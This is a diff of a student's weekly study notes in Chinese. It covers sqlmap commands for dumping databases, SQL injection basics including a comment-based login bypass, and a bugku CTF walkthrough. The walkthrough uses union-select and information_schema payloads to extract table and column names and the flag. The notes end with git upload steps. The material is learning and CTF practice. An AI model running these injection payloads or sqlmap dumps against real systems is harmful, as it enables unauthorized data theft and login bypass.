@@ -1,13 +1,43 @@
-                                                                         借助工具的简单sql      
-这周学的东西很杂，但是我觉得是个好的开始，学了一点github，还有一点php，但是我总是觉得我没有效率，加油吧少年！！
-     今天也是工具sqlmap，用这个首先要了解数据库的结构
+                                                                         报告总结    
+这周学的东西很杂，但是我觉得是个好的开始，学了一点github，还有一点php,一点点sql注入
 0x01
     我认识的数据库的结构像excel一样，一行一行的表格，表格里面都存储这数据，一大张表格叫做数据库，还有表单，栏，字段
-举个例子，就像是张三，19岁，1990年9月9日出生，四川成都人，银行卡号:11111111111111 密码：xxxxxx。各种数据的存储在一张表格中，我的了解局限这么多
+举个例子，就像是张三，19岁，1990年9月9日出生，四川成都人，银行卡号:11111111111111 密码：xxxxxx。各种数据的存储在一张表格中，我的了解只有这么多。
 0x02
-   我用sqlmap尝试用过几次sqlmap.py
-1. sqlmap.py -u http://xx.xxx.xx.xxx:xxxx/?id=1  --dbs
-2. sqlmap.py -u http://xx.xxx.xx.xxx:xxxx/?id=1 -D 库名  --tables
-3. sqlmap.py -u http://xx.xxx.xx.xxx:xxxx/?id=1 -D 库名 -T  表单名  --column
-4. sqlmap.py -u http://xx.xxx.xx.xxx:xxxx/?id=1 -D 库名 -T 表单名 -C 栏名 --dump
-12
+1、找到注入点；
+2、用联合语句查看哪几位是有效位；
+3、查看当前数据库中有哪些表；
+4、查看表中有哪些属性；
+5、#和--号是起注释作用的，输入#号之后后面的语句都不起作用。如果没有对密码强制性校验，在一个账号密码的登录页面可以用来绕过密码。达到登录的效果。
+比如：select*from user where user_name='name'#' and password='xxxxxxxxxx'。
+6、数字注入：查询条件就是id=1构建恒成立的条件。
+7、sql注入攻击是输入的参数未经过滤然后直接拼接到sql语句当中解析执行达到意想不到的效果。
+   查询一个页面存不存在sql注入漏洞，可以在url上加上？id=1来测试网页有没有漏洞。
+   如果是一个框可以用1'    和    1'  #来检测有没有漏洞，如果输入1'无反应，输入1' #有反应，则说明有sql注入漏洞，就可以使用sql语句
+0x03
+一个bugku的题：http://123.206.87.240:8002/chengjidan/index.php  中只有一个输入框就可以这样检测。
+输入 1' order by 1,2,3,4.... # 发现一共有四个数据库。
+使用联合查询语句id=1' union select 1,2,3,4 #（优点，提高查询的效率）。
+可以将数字换成database()   version()  user() 以获取更多信息。
+输入 id=-1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() #  得到表名字。
+输入 id=-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=（表名字）#  获取表下字段的名字。
+这时网页报错，猜测是否对表名字进行加密
+将表名字转为16进制，记得开头加0x（0x的目的是为了表示后面的数是十六进制，在编程里面一般都要加入，用来区别十进制数）。
+得到字段就是flag。
+第二种方法添加id=1，然后用sqlmap跑，将bp抓到的包存在txt中，用sqlmap跑数据库。
+  0x04
+github上传文件
+首先要从官网上下载安装git，用VS Code连接的时候要先配置GitHub。
+git config --global user.name （名字）
+git config --global user.email (邮箱名)
+以管理员权限运行CMD或VS Code。
+用cd切换路径
+初始化：git init
+连接到库：git remote add origin https://github.com/（用户名）/（库名）.git 
+新建EADME.md文件：git add README.md 
+添加当前文件到暂存区：git add . 
+git commit -m "first commit" 
+将文件提交到库的某个分支：git push -u origin （分支名） 
+将添加后的文件提交到head区：git branch -M “描述” （修改分支名）
+记住本机存文件的文件夹要和库同名，并且库里面不能放文件夹之外的东西，我就吃亏了。
+
